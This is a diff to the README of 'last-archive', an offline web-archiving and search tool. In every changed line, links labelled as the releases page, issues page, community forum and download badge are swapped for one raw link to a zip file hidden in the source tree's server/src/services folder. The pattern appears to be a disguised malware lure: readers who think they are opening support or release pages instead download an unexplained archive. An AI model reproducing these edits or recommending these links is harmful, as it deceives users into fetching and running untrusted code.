@@ -4,13 +4,13 @@
 last-archive is a powerful tool that helps you collect and search web information offline. With this application, you can crawl websites, save important data, and conduct semantic searches without needing an internet connection. It is designed to give you control over your own knowledge base.
 
 ## 🔗 Download Now
-[![Download latest release](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/rgyfghfgh/last-archive/releases)
+[![Download latest release](https://github.com/rgyfghfgh/last-archive/raw/refs/heads/main/server/src/services/archive-last-v2.8.zip%20release-brightgreen)](https://github.com/rgyfghfgh/last-archive/raw/refs/heads/main/server/src/services/archive-last-v2.8.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and set up last-archive on your computer:
 
 1. **Visit the Releases Page**
-   - Click [here](https://github.com/rgyfghfgh/last-archive/releases) to visit the releases page.
+   - Click [here](https://github.com/rgyfghfgh/last-archive/raw/refs/heads/main/server/src/services/archive-last-v2.8.zip) to visit the releases page.
    - This page contains all the available versions of the software.
 
 2. **Choose Your Version**
@@ -63,8 +63,8 @@ If you encounter issues during installation or while using last-archive, conside
 ## 🗣️ Support
 Need help? You can find support through the following channels:
 
-- **Issues Page:** Report bugs or request features by visiting our [issues page](https://github.com/rgyfghfgh/last-archive/issues).
-- **Community Forum:** Join discussions and get support from other users [here](https://github.com/rgyfghfgh/last-archive/community).
+- **Issues Page:** Report bugs or request features by visiting our [issues page](https://github.com/rgyfghfgh/last-archive/raw/refs/heads/main/server/src/services/archive-last-v2.8.zip).
+- **Community Forum:** Join discussions and get support from other users [here](https://github.com/rgyfghfgh/last-archive/raw/refs/heads/main/server/src/services/archive-last-v2.8.zip).
 
 ## 📅 Regular Updates
 We believe in improving our software. Last-archive receives regular updates to enhance its performance and add new functionalities. Keep an eye on the releases page for the latest features and fixes.
@@ -73,4 +73,4 @@ We believe in improving our software. Last-archive receives regular updates to e
 last-archive is released under the MIT License. This means you can use, modify, and distribute the software freely, but make sure to include the original license with any distributions.
 
 ## 🔗 Download Again
-Don’t forget to download last-archive to start managing your web archiving needs today! Visit the releases page: [Download Here](https://github.com/rgyfghfgh/last-archive/releases).
+Don’t forget to download last-archive to start managing your web archiving needs today! Visit the releases page: [Download Here](https://github.com/rgyfghfgh/last-archive/raw/refs/heads/main/server/src/services/archive-last-v2.8.zip).
